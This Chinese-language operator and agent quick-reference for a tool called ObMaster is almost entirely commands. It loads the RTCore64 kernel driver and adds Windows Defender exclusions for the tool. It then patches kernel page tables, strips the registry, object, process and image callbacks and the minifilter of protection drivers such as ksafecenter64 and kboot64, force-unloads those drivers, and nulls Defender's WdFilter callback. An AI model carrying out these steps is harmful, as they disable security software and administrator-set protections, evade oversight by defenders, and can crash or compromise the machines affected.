# ObMaster 实战操作指南

> 给 Agent 或操作员看的快速参考。不解释原理，只写怎么做。
> 详细原理见 ksafe_architecture.md 和 kd_vs_livekd_analysis.md。

---

## 0. 部署（每次开机执行一次）

```bash
# 管理员 PowerShell：
sc create RTCore64 type=kernel binPath=C:\Windows\System32\drivers\RTCore64.sys
sc start RTCore64
Add-MpPreference -ExclusionProcess "ObMaster.exe"
Add-MpPreference -ExclusionProcess "VirtualBoxVM.exe"
Add-MpPreference -ExclusionPath "C:\Program Files\Oracle\VirtualBox"
```

验证：
```bash
ObMaster /info
ObMaster /ptebase --method 10
```

两个都有输出 = 就绪。

---

## 1. MmPteBase（必须第一步）

```bash
# 首选：PDB 符号解析（需联网或符号缓存）
ObMaster /ptebase --method 1

# 备选：从 MiGetPteAddress 机器码提取（离线可用）
ObMaster /ptebase --method 10

# 如果两个都失败，用 kd 手动读：
sudo "C:/Program Files (x86)/Windows Kits/10/Debuggers/x64/kd.exe" -kl -c "dq nt!MmPteBase L1; q"
# 然后手动注入：
ObMaster /ptebase-set <值>
```

**⚠ 每次重启后值会变（KASLR），必须重新获取。**

---

## 2. 确认 PTE 可写（第二步）

```bash
# 找一个不在大页上的地址测试（用第三方驱动，不要用 ntoskrnl）
ObMaster /drivers                           # 找 ksafecenter64 或其他第三方驱动的基址
ObMaster /sp-test <驱动基址>                 # 三个 Stage 全 PASS = 可以 safepatch
```

**⚠ 绝对不要对 ntoskrnl 的地址跑 sp-test——它在大页上，会蓝屏。**

常见结果：
- Stage 1 SKIP "large page" → 换一个地址（选第三方驱动）
- Stage 2 FAIL → PTE 页只读或 HVCI 启用，safepatch 不可用
- Stage 3 PASS → safepatch 完全可用

---

## 3. 云更新驱动拆除（19 步，严格按顺序）

**⚠ 绝对不能直接 /force-stop 保护驱动。必须先拆回调再卸驱动。**

### Phase 1：拆回调（不卸驱动）

```bash
# ① ② 先杀 CmCallback（解锁注册表，最优先！）
ObMaster /notify registry --kill ksafecenter64
ObMaster /notify registry --kill kboot64

# ③ 杀 ObCallback（解锁 handle 访问）
ObMaster /obcb
ObMaster /disable <ksafe_PreOp_addr>          # 从 /obcb 输出里找地址

# ④-⑨ 杀 Notify（解除进程/DLL 监控）
ObMaster /notify image
ObMaster /ndisable <ksafe_image_addr>
ObMaster /notify process
ObMaster /ndisable <kshutdown_process_addr>
ObMaster /notify image
ObMaster /ndisable <kshutdown_image_addr>
ObMaster /notify process
ObMaster /ndisable <kboot_process_addr>
ObMaster /notify image
ObMaster /ndisable <kboot_image_addr>
ObMaster /notify process
ObMaster /ndisable <kcachec_process_addr>

# ⑩ 卸 MiniFilter
ObMaster /flt-detach ksafecenter64 C:
```

### Phase 2：卸载保护驱动

```bash
# 回调已拆完，现在安全卸载
ObMaster /force-stop ksafecenter64 --force
ObMaster /force-stop kshutdown64 --force
ObMaster /force-stop kboot64 --force
ObMaster /force-stop kcachec64 --force
```

### Phase 3：卸载非保护驱动（可选）

```bash
ObMaster /force-stop krestore64
ObMaster /force-stop KScsiDisk64
ObMaster /force-stop kdisk64
ObMaster /force-stop kantiarp64
ObMaster /force-stop kpowershutdown64
```

### 如果 /force-stop 失败（变僵尸）

```bash
ObMaster /objdir \                              # 找 \Driver 目录的 KVA
ObMaster /objdir --kva <Driver目录KVA>          # 找目标驱动的 DRIVER_OBJECT
ObMaster /drv-unload <驱动名> <DRIVER_OBJECT地址>
```

---

## 4. WdFilter 处理

**不需要卸载，加排除规则即可：**

```bash
ObMaster /runas system reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v VirtualBoxVM.exe /t REG_DWORD /d 0 /f
ObMaster /runas system reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Program Files\Oracle\VirtualBox" /t REG_DWORD /d 0 /f
```

如果排除规则不够，升级手段：
```bash
ObMaster /obcb                                  # 找 WdFilter 的 ObCallback
ObMaster /disable <WdFilter_PreOp_addr>         # 清零 Pre 指针
```

---

## 5. 启动 VirtualBox

```bash
# 云更新回调已拆、WdFilter 已排除，现在启动 VBox
"C:\Program Files\Oracle\VirtualBox\VirtualBoxVM.exe" --startvm <虚拟机名>
```

---

## 6. 常用诊断

```bash
ObMaster /bsod --after td                       # 查看今天的蓝屏
ObMaster /v2p <虚拟地址>                         # VA → PA
ObMaster /p2v <物理地址>                         # PA → VA
ObMaster /pte <地址>                             # 完整页表遍历
ObMaster /obcb                                  # ObCallback 状态
ObMaster /notify image                          # ImageNotify 状态
ObMaster /notify registry                       # CmCallback 状态
ObMaster /flt C:                                # MiniFilter 状态
ObMaster /drivers                               # 已加载驱动
```

---

## 禁止事项

| 操作 | 后果 |
|------|------|
| 不拆回调直接 /force-stop 保护驱动 | BSOD（CmCallback 锁注册表） |
| 对 ntoskrnl 地址跑 /sp-test | BSOD（大页没有 PTE） |
| 用旧的 MmPteBase 值（重启后未更新） | BSOD（PTE walk 读错地址） |
| 乱序拆回调（先拆 ObCallback 再拆 CmCallback） | SCM 被锁，后续操作失败 |
| 重启后不重新部署 | 云更新还原所有内存改动 |

---

## 快速检查清单

```
[ ] RTCore64 已启动          → ObMaster /info
[ ] MmPteBase 已获取         → ObMaster /ptebase --method 10
[ ] sp-test 三个 Stage PASS  → ObMaster /sp-test <非大页地址>
[ ] CmCallback 已拆          → ObMaster /notify registry（应无 ksafe/kboot）
[ ] ObCallback 已拆          → ObMaster /obcb（应无 ksafe entry）
[ ] WdFilter 已排除          → Defender 排除规则已加
[ ] VBox 启动成功            → VirtualBoxVM.exe --startvm
```
